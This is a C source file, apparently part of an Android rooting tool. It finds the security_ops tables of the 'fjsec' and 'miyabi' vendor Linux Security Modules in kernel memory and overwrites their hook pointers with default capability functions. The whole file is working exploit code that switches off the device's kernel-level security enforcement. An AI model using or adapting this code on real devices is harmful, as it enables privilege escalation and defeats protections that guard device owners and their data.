#define _LARGEFILE64_SOURCE
#include <stdio.h>
#include <string.h>

#include "kernel_memory.h"
#include "libkallsyms/kallsyms_in_memory.h"

#define SECURITY_NAME_MAX       10

#define SECURITY_OPS_START      ((SECURITY_NAME_MAX + 3) / 4)
#define SECURITY_OPS_END        180

#define DEFAULT_CAP_PREFIX      "cap_"
#define DEFAULT_CAP_FUNCTION    "cap_syslog"

static unsigned long int *security_ops = NULL;

static bool
unlock_lsm(kallsyms *info, const char *symbol_prefix)
{
  int count = 0;
  int symbol_prefix_len;
  int i;

  if (security_ops == NULL) {
    printf("security_ops: not found\n");
    goto exit_failed;
  }

  symbol_prefix_len = strlen(symbol_prefix);

  for (i = SECURITY_OPS_START; i < SECURITY_OPS_END; i++) {
    if (security_ops[i]) {
      const char *name = kallsyms_in_memory_lookup_address(info, (unsigned long)security_ops[i]);
      if (!name) {
        break;
      }

      printf("security_ops[%d] = 0x%08x <%s>\n", i, security_ops[i], name);

      if (strncmp(name, symbol_prefix, symbol_prefix_len) == 0) {
        char fix_name[256];
        void *fix_func = NULL;

        if (strlen(name + symbol_prefix_len) + sizeof (DEFAULT_CAP_PREFIX) < sizeof (fix_name)) {
	  strcpy(fix_name, DEFAULT_CAP_PREFIX);
	  strcat(fix_name, name + symbol_prefix_len);
	  fix_func = (void *)kallsyms_in_memory_lookup_name(info, fix_name);
	}

        if (fix_func == NULL) {
	  strcpy(fix_name, DEFAULT_CAP_FUNCTION);
	  fix_func = (void *)kallsyms_in_memory_lookup_name(info, fix_name);
	}

	if (fix_func == NULL) {
	  printf("fix_func for <%s>: not found\n", name);
	  goto exit_failed;
	}

        printf("%08x: <%s>: fixed <%s>\n",
	       convert_to_kernel_virtual_address(&security_ops[i]), name, fix_name);

      	security_ops[i] = (unsigned long int)fix_func;
      	count++;
      }
    }
  }

  printf("  %d functions are fixed.\n", count);

  security_ops = NULL;
  return count > 0;

exit_failed:
  security_ops = NULL;
  return false;
}

bool
has_fjsec_lsm(kallsyms *info)
{
  char security_ops_name[SECURITY_NAME_MAX + 1];
  void *start, *end;
  void *search_address;

  security_ops = NULL;

  memset(security_ops_name, 0, sizeof security_ops_name);
  strcpy(security_ops_name, "fjsec");

  start = convert_to_kernel_mapped_address((void *)KERNEL_BASE_ADDRESS);
  end = start + KERNEL_MEMORY_SIZE;

  while (true) {
    unsigned long int size;

    size = (end - start) - sizeof security_ops_name;
    if (size <= 0) {
      return false;
    }

    security_ops = memmem(start, size, security_ops_name, sizeof security_ops_name);
    if (!security_ops) {
      return false;
    }

    if (security_ops[SECURITY_OPS_START]) {
      if (kallsyms_in_memory_lookup_address(info, security_ops[SECURITY_OPS_START])) {
	return true;
      }
    }

    start = &security_ops[SECURITY_OPS_START];
  }

  return true;
}

bool
unlock_fjsec_lsm(kallsyms *info)
{
  return unlock_lsm(info, "fjsec_");
}

bool
has_miyabi_lsm(kallsyms *info)
{
  struct miyabi_check {
    void *ptrace_access_check_address;
    void *ptrace_traceme_address;
  } miyabi_check;
  void *kernel_entry;
  unsigned long offset;
  void *found;

  security_ops = NULL;

  kernel_entry = convert_to_kernel_mapped_address((void *)KERNEL_BASE_ADDRESS);

  miyabi_check.ptrace_access_check_address = (void *)kallsyms_in_memory_lookup_name(info, "miyabi_ptrace_access_check");
  miyabi_check.ptrace_traceme_address = (void *)kallsyms_in_memory_lookup_name(info, "miyabi_ptrace_traceme");
  if (!miyabi_check.ptrace_access_check_address || !miyabi_check.ptrace_traceme_address) {
    return false;
  }

  for (offset = 0; offset < KERNEL_MEMORY_SIZE; offset = found - kernel_entry + sizeof (miyabi_check)) {
    void *search_address;
    unsigned long search_size;

    search_address = kernel_entry + offset;
    search_size = KERNEL_MEMORY_SIZE - offset;

    found = memmem(search_address, search_size - sizeof (miyabi_check),
                   &miyabi_check, sizeof miyabi_check);

    if (!found) {
      return false;
    }

    if (!is_address_in_kallsyms_table(info, found)) {
      security_ops = found - sizeof (*security_ops) * SECURITY_OPS_START;
      return true;
    }
  }

  return false;
}

bool
unlock_miyabi_lsm(kallsyms *info)
{
  return unlock_lsm(info, "miyabi_");
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
